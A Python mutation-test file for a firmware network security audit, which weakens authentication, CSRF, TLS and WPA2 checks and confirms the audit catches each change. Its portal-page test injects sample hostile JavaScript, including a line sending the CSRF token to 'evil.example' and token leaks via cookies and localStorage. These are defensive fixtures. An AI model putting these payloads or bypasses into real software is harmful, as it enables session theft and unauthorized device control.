#!/usr/bin/env python3
"""Mutation tests against the shipped V3 audit, without rewriting any checkout."""
from pathlib import Path
import sys
import re
import unittest
sys.path.insert(0,str(Path(__file__).resolve().parents[1]))
import static_audit as audit

class NetworkAuditTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.files=[(p,audit.strip_comments(p.read_text())) for p in audit.iter_source_files()]
    def check(self,mutation=None):
        files=list(self.files)
        if mutation:
            name,old,new=mutation
            for i,(path,code) in enumerate(files):
                if path.name==name:
                    pattern="".join(re.escape(c)+r"\s*" for c in old if not c.isspace())
                    self.assertRegex(code,pattern)
                    files[i]=(path,re.sub(pattern,lambda _:new,code,count=1));break
            else:self.fail(name)
        audit.failures.clear()
        audit.check_network_v3_boundaries(files,audit.SKETCH_DIR)
        return list(audit.failures)
    def test_baseline(self):self.assertEqual(self.check(),[])
    def test_mutations(self):
        mutations=[
          ('NetworkConfigNvs.cpp','"nvs"','"matdog_nvs"'),
          ('NetworkConfigNvs.cpp','"md_net_v1"','"md_rf_diag"'),
          ('NetworkConfig.cpp','storage_->activate(candidate_)','true'),
          ('NetworkConfig.cpp','storage_->pending(c)','true'),
          ('WifiManager.cpp','drv.sta.bssid_set=false','drv.sta.bssid_set=true'),
          ('WifiManager.cpp','if(worker_status_.scan_running && context_.load()){esp_wifi_scan_stop()', 'if(worker_status_.scan_running && context_.load()){removedScanStop()'),
          ('HttpTransport.cpp','portal_.authorize','unauthenticatedBypass'),
          ('HttpTransport.cpp','!req.tls || req.ap_socket','false'),
          ('HttpTransport.cpp','ready_sequence_.load()==id','true'),
          ('PortalSecurity.cpp','tokenEqual(csrf,csrf_)','true'),
          ('PortalSecurity.cpp','peer==peer_','true'),
          ('CommandRouter.cpp','(WIFI command redacted)','LEAK'),
          ('ControllerService.h','networkCritical()','bypassCritical()'),
        ]
        mutations += [
          ('WifiManager.cpp','mode == WIFI_MODE_AP','mode == WIFI_MODE_APSTA'),
          ('WifiManager.cpp','AdminLease lease(admin_)','RemovedLease lease(admin_)'),
          ('WifiManager.cpp','admin_.allowed(r.generation)','true'),
          ('HttpTransport.cpp','httpd_stop(server_) == ESP_OK','true'),
          ('HttpTransport.cpp','httpd_ssl_stop(tls_server_) == ESP_OK','true'),
          ('HttpTransport.cpp','self->admitAdmin(r)','true'),
          ('HttpTransport.cpp','gate.allowed(req.admin_generation)','true'),
        ]
        # WPA2 bring-up: the profile write stays an acknowledged, verified,
        # WPA2-only command, and request outcomes stay bound to their request.
        mutations += [
          ('WifiManager.cpp','expected_events_.store(kApStop | kApStart)','expected_events_.store(0)'),
          ('WifiManager.cpp','if (!apConfigApplied())','if (false)'),
          ('WifiManager.cpp','out->ap.authmode = WIFI_AUTH_WPA2_PSK','out->ap.authmode = WIFI_AUTH_OPEN'),
          ('WifiManager.cpp','current.ap.authmode == WIFI_AUTH_WPA2_PSK','true'),
          ('WifiManager.cpp','admin_.raiseFault(FaultSite::UNEXPECTED_ROLE_EVENT, bit, pending)','(void)pending'),
          ('WifiManager.cpp','ok = esp_wifi_set_config(WIFI_IF_AP, &want) == ESP_OK','ok = WiFi.softAP("x", "y", 1, false, 4)'),
          ('WifiManager.cpp','tagged.seq = ++request_seq_','tagged.seq = 0'),
          ('WifiManager.cpp','sameKey(candidate, config_.ap_password)','true'),
          ('WifiManager.cpp','if (!lease) return false;','if (!lease) return true;'),
          ('CommandRouter.cpp','WIFI_PROVISION=REFUSED kind=%s reason=%s','WIFI_PROVISION=QUEUED'),
          ('CommandRouter.cpp','seq=%lu kind=%s result=%s','result=COMMITTED'),
        ]
        # Persistent administrator recognition and the STA router test.
        mutations += [
          ('PortalSecurity.cpp','!anyByte(digest, 32)','false'),
          ('PortalSecurity.cpp','if (!portalDeviceValid(digest, device))','if (false)'),
          ('PortalSecurity.cpp','diff |= raw[16 + i] ^ tag[i]','diff |= 0'),
          ('PortalSecurity.cpp','update::hmac256(digest, 32, message, sizeof(message), tag)','memcpy(tag, message, 32)'),
          ('PortalSecurity.cpp','return current(now, peer, cookie) && tokenEqual(csrf, csrf_);','return current(now, peer, cookie);'),
          ('PortalSecurity.cpp','now - issued_ < 300000','now - issued_ < 4000000000'),
          ('HttpTransport.cpp','if (req.remember)','if (true)'),
          ('HttpTransport.cpp','md_device=%s; HttpOnly;','md_device=%s;'),
          ('HttpTransport.cpp','Path=/wifi/session; Max-Age=34560000','Path=/; Max-Age=34560000'),
          ('HttpTransport.cpp','if (req.local_authorized && !portal_.current(now, req.peer, req.cookie))','if (!portal_.current(now, req.peer, req.cookie))'),
          ('HttpTransport.cpp','{"/wifi/session", HTTP_POST','{"/wifi/session", HTTP_GET'),
          ('HttpTransport.cpp','r.remember = !motion_auth && read == 81 && memcmp(body + 70, "&remember=1", 11) == 0','r.remember = read > 70'),
          ('HttpTransport.h','WIFI_STATUS,','WIFI_SESSION, WIFI_STATUS,'),
          ('WifiManager.cpp','const bool proven = match && now - test_stable_since_ >= kStaTestHoldMs;','const bool proven = match;'),
          ('WifiManager.cpp','transaction_.update(now, proven, link_up, critical)','transaction_.update(now, link_up, link_up, critical)'),
          ('WifiManager.cpp','if (!match) test_stable_ = false;','if (!match) {}'),
          ('WifiManager.cpp','!sta_link_.load()','true'),
        ]
        # Radio role by operating mode.
        mutations += [
          ('NetworkPolicy.h','return i.maintenance_lan && i.sta_profile && !i.recovery ? RoleReason::MAINTENANCE_STA_READONLY : RoleReason::MAINTENANCE_AP;','return i.sta_profile ? RoleReason::RUN_STA : RoleReason::MAINTENANCE_AP;'),
          ('NetworkPolicy.h','return i.recovery ? RoleReason::RUN_RECOVERY_AP : RoleReason::RUN_STA;','return RoleReason::RUN_STA;'),
          ('NetworkPolicy.h','return r == RoleReason::RUN_STA || r == RoleReason::MAINTENANCE_STA_READONLY;','return r != RoleReason::MAINTENANCE_AP;'),
          ('NetworkPolicy.h','bool run = false, sta_profile = false, recovery = false;','bool run = false, sta_profile = false, recovery = false, ap_always = false;'),
          ('NetworkPolicy.h','if (!i.sta_profile)\n    return RoleReason::RUN_NO_PROFILE_AP;','if (!i.sta_profile || i.ap_always)\n    return RoleReason::RUN_NO_PROFILE_AP;'),
          ('WifiManager.cpp','in.recovery = recovery_;','in.recovery = recovery_ || config_.ap_always;'),
          ('WifiManager.cpp','in.sta_profile = profile;','in.sta_profile = profile && !config_.ap_always;'),
          ('WifiManager.cpp','} else if (enabled_ && roleIsSta(role_)) {','} else if (enabled_ && roleIsSta(role_) && !config_.ap_always) {'),
          ('NetworkPolicy.h','return dwell > cap_ms ? cap_ms : static_cast<uint32_t>(dwell);','return 0;'),
          ('WifiManager.cpp','} else if (enabled_ && roleIsSta(role_)) {','} else if (enabled_) {'),
          ('WifiManager.cpp','if (worker_status_.ap_active && roleIsSta(role_) && !configBusy())','if (worker_status_.ap_active && !configBusy() && now - ap_since_ >= config_.ap_timeout_ms)'),
          ('WifiManager.cpp','if (enabled_ && !transaction_.busy() && !configBusy() && !roleIsSta(role_))','if (enabled_ && !transaction_.busy() && !configBusy() && config_.ap_always)'),
          ('WifiManager.cpp','if (!on) { last_post_ = PostResult::INVALID; return false; }','if (!on && status_.ap_always) { last_post_ = PostResult::INVALID; return false; }'),
          ('WifiManager.cpp','policy_.counters().connect_attempts - sta_attempt_base_ >= kStaEpisodeAttempts','false'),
          ('WifiManager.cpp','(admin_.phase.load() != NetworkPhase::ADMIN_AP || !WiFi.softAPgetStationNum())','true'),
          ('WifiManager.cpp','role_ = evaluateRole(now);','role_ = RoleReason::RUN_STA;'),
          ('Controller.cpp','wifi_.setRunMode(operating_mode_.mode() == OperatingMode::RUN);','wifi_.setRunMode(operating_mode_.mode() != OperatingMode::MAINTENANCE);'),
          ('Controller.cpp','wifi_.setRunMode(operating_mode_.mode() == OperatingMode::RUN);','wifi_.setRunMode(true); operating_mode_.setMode(OperatingMode::RUN);'),
          ('WifiManager.h','void setRunMode(bool run) { run_mode_.store(run); }','void setRunMode(bool run) { run_mode_.store(run); } OperatingModeManager *mode_ = nullptr;'),
          ('HttpTransport.cpp','service_->wifiStatus();','service_->wifiStatus(); service_->wifi().setRunMode(true);'),
        ]
        for mutation in mutations:
            with self.subTest(mutation=mutation):self.assertTrue(self.check(mutation))
    def test_portal_page(self):
        page=(audit.SKETCH_DIR/'src/network/PortalPage.h').read_text()
        def check(text):
            audit.failures.clear();audit.check_portal_page_text(text);return list(audit.failures)
        self.assertEqual(check(page),[])
        script='<script>\n'
        for old,new in [
            ('<script>\n','<script src="https://cdn.example/x.js"></script><script>\n'),
            (script,script+"new Image().src='http://evil.example/?'+csrf;\n"),
            (script,script+"document.body.innerHTML=wf.ap_ssid;\n"),
            (script,script+"document.cookie='md_device='+csrf;\n"),
            (script,script+"store.set('md_csrf',csrf);\n"),
            (script,script+"localStorage.setItem('t',csrf);\n"),
            (script,script+"fetch('/wifi/login?token='+csrf);\n"),
            (script,script+"fetch('/servo/move');\n"),
            ('POLL_MS=4000','POLL_MS=200'),
            ('<header class="top">','<p>HARDWARE VALIDATED</p><header class="top">'),
            ('<header class="top">','<p>Firmware offline candidate.</p><header class="top">'),
            ('<button data-page="ota">OTA</button>',''),
            ("store.set('md_login',String(sessionAt))","store.set('md_login',token)"),
        ]:
            with self.subTest(old=old,new=new):
                self.assertIn(old,page);self.assertTrue(check(page.replace(old,new,1)))
    def test_second_writer(self):
        audit.failures.clear()
        files=self.files+[(audit.SKETCH_DIR/'src/network/Backdoor.cpp','nvs_set_blob(h,k,b,n);')]
        audit.check_network_v3_boundaries(files,audit.SKETCH_DIR)
        self.assertTrue(audit.failures)
    def test_loop_flash_or_untrusted_sleep(self):
        for name,old,new in [
            ('WifiManager.cpp','(void)now_ms;const uint32_t start=micros();','nvs_commit(0);(void)now_ms;const uint32_t start=micros();'),
            ('WifiManager.cpp','SleepInputs sleep{};','SleepInputs sleep{};sleep.session_trusted=true;'),
            ('HttpTransport.cpp','void HttpTransport::wifiResponse','void HttpTransport::wifiResponse'),
        ][:2]:
            with self.subTest(name=name):self.assertTrue(self.check((name,old,new)))

if __name__=='__main__':unittest.main()
